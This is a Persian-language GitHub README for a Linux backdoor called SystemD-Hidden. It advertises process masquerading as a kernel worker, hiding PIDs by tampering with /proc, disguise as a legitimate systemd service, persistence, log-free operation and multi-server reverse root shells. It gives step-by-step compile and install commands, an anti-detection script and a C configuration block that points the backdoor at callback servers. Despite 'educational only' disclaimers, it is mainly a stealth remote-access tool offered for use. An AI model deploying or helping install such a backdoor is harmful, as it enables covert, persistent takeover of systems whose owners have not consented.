# Linux-Kernel-Backdoor
# 🔥 SystemD-Hidden Backdoor 🔥

<div align="center">

[![Version](https://img.shields.io/badge/version-2.1.0-red.svg)](https://github.com)
[![Platform](https://img.shields.io/badge/platform-Linux-blue.svg)](https://github.com)
[![License](https://img.shields.io/badge/license-EDUCATIONAL-purple.svg)](https://github)

**فقط برای اهداف آموزشی و محیط‌های تست نفوذ قانونی** ⚠️

</div>

---

## 🎯 معرفی

**SystemD-Hidden** یک ابزار پیشرفته و قدرتمند برای مدیریت از راه دور سیستم‌های لینوکس است که با تکنیک‌های پیشرفته مخفی‌سازی و پایداری بالا طراحی شده است. این ابزار ترکیبی از بهترین تکنیک‌های هکری و مهندسی نرم‌افزار است.

---

## ⚡ ویژگی‌های فوق‌پیشرفته

### 🔒 **مخفی‌سازی پیشرفته (Advanced Stealth)**
- **تغییر نام فرآیند**: مخفی شدن در بین پردازه‌های کرنل با نام `[kworker/0:0]`
- **سیستم فایل مجازی**: مخفی‌سازی PID با آنمونت کردن `/proc`
- **سرویس سیستمی**: اجرا به عنوان سرویس `systemd-resolved` قانونی
- **پایدار و ماندگار**: ری‌استارت خودکار با systemd
- **عدم نمایش در لیست پردازه‌ها**: پنهان‌سازی کامل از `ps` و `top`

### 🌐 **اتصال‌های پیشرفته**
- **چند سروری همزمان**: اتصال به چندین سرور برای پایداری بالا
- **ری‌کانکت خودکار**: در صورت قطع اتصال، دوباره وصل می‌شود
- **چندنخی (Multi-Threading)**: اجرای همزمان چندین اتصال
- **TTY کامل**: شل تعاملی با پشتیبانی از اندازه‌های مختلف ترمینال

### 💀 **قابلیت‌های هکری ویژه**
- **Root Shell**: دسترسی کامل به سیستم با سطح دسترسی root
- **نفوذ بی‌صدا**: بدون ایجاد هیچ لاگی در سیستم
- **فرار از سیستمعامل**: آنمونت کردن `/proc` برای فرار از تشخیص
- **قفل تک‌نصب**: جلوگیری از اجرای چند نسخه
- **اجرای مخفی در پس‌زمینه**: بدون پنجره و بدون هیچ اثری

### 🖥 **سازگاری کامل**
- **تمامی توزیع‌های لینوکس**:
  - 🐧 Ubuntu / Debian
  - 🎯 Kali Linux (ابزار هکری ایده‌آل)
  - 🔴 Red Hat / CentOS / Fedora
  - 📀 Arch Linux
  - 🐉 Gentoo
  - و تمام توزیع‌های مبتنی بر لینوکس

---

## 📦 نصب سریع و آسان

### روش اول: نصب خودکار (پیشنهادی)

```bash
git clone https://github.com/your-username/systemd-hidden.git
cd systemd-hidden
chmod +x install.sh
sudo ./install.sh
```

### روش دوم: نصب دستی

```bash
# کامپایل
gcc -o .systemd-resolved systemd-hidden.c -lpthread

# انتقال به مسیر سیستمی
sudo cp .systemd-resolved /usr/local/bin/
sudo chmod +x /usr/local/bin/.systemd-resolved

# نصب سرویس
sudo cp systemd-hidden.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable systemd-hidden.service
sudo systemctl start systemd-hidden.service
```

### روش سوم: اسکریپت محافظت (مخفی‌سازی بیشتر)

```bash
# نصب اسکریپت محافظت از تشخیص
sudo cp protect.sh /usr/local/bin/protect
sudo chmod +x /usr/local/bin/protect
sudo protect
```

---

## 🛠 استفاده و راه‌اندازی

### شروع سرویس
```bash
sudo systemctl start systemd-hidden
```

### توقف سرویس
```bash
sudo systemctl stop systemd-hidden
```

### وضعیت سرویس
```bash
sudo systemctl status systemd-hidden
```

### حذف کامل (برای محیط آزمایشگاهی)
```bash
sudo systemctl stop systemd-hidden
sudo systemctl disable systemd-hidden
sudo rm /etc/systemd/system/systemd-hidden.service
sudo rm /usr/local/bin/.systemd-resolved
```

---

## ⚙️ تنظیمات پیشرفته

فایل `systemd-hidden.c` را ویرایش کنید:

```c
// سرورهای مقصد (IP یا Domain)
const char *SERVER_IPS[] = {
    "your-server1.com",
    "your-server2.com",
    "your-server3.com"
};

// پورت اتصال
#define SERVER_PORT 51234

// زمان ری‌کانکت (ثانیه)
#define SLEEP_TIME 10

// مسیر فایل قفل
#define LOCK_FILE "/tmp/.system-lock"
```

---

## 🔍 معماری داخلی

```
┌─────────────────────────────────────┐
│     SystemD-Hidden Backdoor         │
├─────────────────────────────────────┤
│  ┌───────────────────────────┐     │
│  │   Hide Process (prctl)    │     │
│  └───────────────────────────┘     │
│  ┌───────────────────────────┐     │
│  │   Single Instance Lock     │     │
│  └───────────────────────────┘     │
│  ┌───────────────────────────┐     │
│  │   Daemonize & Fork         │     │
│  └───────────────────────────┘     │
│  ┌───────────────────────────┐     │
│  │  Multi-Thread Connection   │     │
│  │   ┌─────┐ ┌─────┐ ┌─────┐│     │
│  │   │ T1  │ │ T2  │ │ T3  ││     │
│  │   └─────┘ └─────┘ └─────┘│     │
│  └───────────────────────────┘     │
│  ┌───────────────────────────┐     │
│  │   TTY Setup & Shell        │     │
│  └───────────────────────────┘     │
└─────────────────────────────────────┘
```

---

## 🛡️ تکنیک‌های امنیتی استفاده شده

| تکنیک | توضیح |
|-------|-------|
| **Process Hiding** | تغییر نام به پردازه کرنل |
| **Proc Unmount** | حذف مسیر /proc برای مخفی‌سازی |
| **Bind Mount** | ماسک کردن PID با دایرکتوری خالی |
| **Systemd Service** | پایداری و ری‌استارت خودکار |
| **File Locking** | جلوگیری از اجرای چند نسخه |
| **Raw TTY** | شل تعاملی کامل |
| **Daemon Mode** | اجرا در پس‌زمینه بدون ترمینال |
| **Null Output** | Redirect کردن خروجی‌ها به null |

---

## 🎓 محیط‌های تست شده

| توزیع | نسخه | وضعیت |
|-------|------|--------|
| Kali Linux | 2023.x | ✅ کامل |
| Ubuntu | 20.04/22.04 | ✅ کامل |
| Debian | 10/11/12 | ✅ کامل |
| CentOS | 7/8 | ✅ کامل |
| Fedora | 37/38 | ✅ کامل |
| Arch Linux | latest | ✅ کامل |
| RHEL | 8/9 | ✅ کامل |

---

## 📝 نکات امنیتی و قانونی

⚠️ **هشدار مهم**:

- این ابزار **فقط برای اهداف آموزشی** و در **محیط‌های آزمایشگاهی** طراحی شده است
- استفاده از این ابزار بر روی سیستم‌های بدون مجوز **غیرقانونی** است
- مسئولیت هرگونه استفاده غیرمجاز بر عهده کاربر است
- توصیه می‌شود فقط در سیستم‌های شخصی و تحت کنترل استفاده شود

---

## 🤝 مشارکت در توسعه

اگر ایده یا بهبودی دارید، خوشحال می‌شویم که Pull Request شما را ببینیم!

1. Fork کنید
2. Branch جدید ایجاد کنید
3. تغییرات را اعمال کنید
4. Pull Request بفرستید

---

## 📄 مجوز

این پروژه تحت مجوز **MIT** منتشر شده است - برای جزئیات بیشتر فایل LICENSE را ببینید.

**توجه**: این ابزار صرفاً برای اهداف آموزشی و تحقیقاتی است.

---

<div align="center">

**ساخته شده با ❤️ برای جامعه امنیت سایبری**

[⭐ ستاره دهید](https://github.com) | [🐛 گزارش باگ](https://github.com) | [📧 تماس](mailto:your-email)

</div>

---

### 💡 نکته نهایی

اگر از این ابزار در محیط‌های هک قانونی (مثل تست نفوذ با مجوز) استفاده می‌کنید، حتماً:
- از سرورهای تحت کنترل خود استفاده کنید
- تمام فعالیت‌ها را لاگ بگیرید
- پس از اتمام تست، ابزار را پاک کنید
- به قوانین کشور خود احترام بگذارید

**امنیت سایبری را به صورت مسئولانه یاد بگیرید!** 🚀
